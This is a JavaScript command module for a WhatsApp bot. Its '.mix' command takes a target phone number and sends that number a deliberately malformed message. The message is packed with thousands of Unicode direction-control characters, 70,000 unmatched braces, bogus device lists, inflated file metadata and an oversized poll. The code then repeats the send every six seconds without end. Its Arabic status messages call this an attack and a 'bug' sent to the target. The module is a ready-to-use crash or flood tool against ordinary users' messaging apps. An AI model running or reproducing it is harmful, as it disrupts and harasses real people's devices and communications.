module.exports = async ({ sock, text, reply, msg }) => {
    if (text.startsWith('.mix')) {
        const target = text.split(' ')[1];
        if (!target) return reply('❗ أدخل الرقم الهدف بعد الأمر\nمثال: .mix 201234567890');

        reply('✅ جارٍ تنفيذ الهجوم، لا تغلق البوت...');

        async function InVsLoop(target) {
            try {
                const msg = {
                    ephemeralMessage: {
                        message: {
                            viewOnceMessage: {
                                message: {
                                    messageContextInfo: {
                                        deviceListMetadata: {
                                            devices: new Array(200).fill({ id: "device", type: "invalid" })
                                        },
                                        deviceListMetadataVersion: 9999999999,
                                    },
                                    interactiveMessage: {
                                        contextInfo: {
                                            mentionedJid: ["13135550002@s.whatsapp.net"],
                                            stanzaId: "Nxth-Id" + Math.floor(Math.random() * 99999),
                                            isForwarded: true,
                                            forwardingScore: 9999,
                                            businessMessageForwardInfo: {
                                                businessOwnerJid: "13135550002@s.whatsapp.net",
                                            },
                                        },
                                        body: {
                                            text: "\u2066".repeat(2000) + "\u202E".repeat(2000) + "[".repeat(2000),
                                        },
                                        nativeFlowMessage: {
                                            name: "native_broadcast_payload",
                                            messageParamsJson: "{".repeat(70000),
                                        }
                                    },
                                    documentMessage: {
                                        fileName: "\u200F".repeat(4000),
                                        mimetype: "application/zip",
                                        fileLength: "999999999999",
                                        mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                                        fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                                        directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                                        mediaKeyTimestamp: "9999999999",
                                        caption: " ".repeat(5000),
                                    },
                                    pollCreationMessage: {
                                        name: "\u202E".repeat(5000),
                                        options: new Array(150).fill({ optionName: "[".repeat(3000) }),
                                        selectableCount: 1
                                    }
                                }
                            }
                        }
                    }
                };

                const sendBack = async () => {
                    const keyId = Math.random().toString(11).substring(2, 10).toUpperCase() + Date.now();
                    await sock.relayMessage(target + '@s.whatsapp.net', msg, {
                        participant: { jid: target + '@s.whatsapp.net' },
                        messageId: keyId,
                        messageTimestamp: 0
                    });
                    console.log(`✔ تم إرسال bug إلى ${target}`);
                };

                await sendBack();

                // تكرار الهجوم كل 6 ثواني
                setInterval(async () => {
                    await sendBack();
                }, 6000);

            } catch (err) {
                console.log("❌ فشل في إرسال الهجوم:", err);
            }
        }

        await InVsLoop(target);
    }
};
